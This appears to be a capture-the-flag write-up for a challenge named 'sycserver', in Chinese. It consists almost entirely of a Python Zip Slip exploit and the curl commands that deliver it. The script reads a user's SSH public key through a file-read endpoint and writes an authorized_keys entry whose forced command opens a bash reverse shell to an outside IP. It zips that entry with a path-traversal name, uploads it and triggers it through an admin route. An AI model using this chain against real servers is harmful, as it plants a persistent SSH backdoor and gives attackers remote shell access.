---
tags: [Zip Slip, 任意文件写入, SSH后门, RCE]
---

# sycserver

zip slip可写文件， admin触发ssh后门

```
┌── (rabbitsHagia-Sophia)-[/tmp] L─ $ cat zz.py
import zipfile
import requests
pub = requests.get('http://119.13.91.238:8888/readfile?
file=/home/vanzy/.ssh/id_rsa.pub ').text
print(pub)
with open( 'hh.txt', 'w') as f:
f.write( 'command="bash -c \'bash -i >&/dev/tcp/118.89.184.205/80 0>&1\'" ' + pub)
# the name of the zip file to generate
zf = zipfile.ZipFile( '1.zip', 'w')
# the name of the malicious file that will overwrite the origial file (must exist on
disk)
fname = 'hh.txt'
#destination path of the file
zf.write(fname, '../home/vanzy/.ssh/authorized_keys')

┌── (rabbitsHagia-Sophia)-[/tmp]
L─$ python3 zz.py && curl -vv -F file=@/tmp/1.zip http://119.13.91.238:8888/file- unarchiver && curl -vv http://119.13.91.238:8888/admin
```

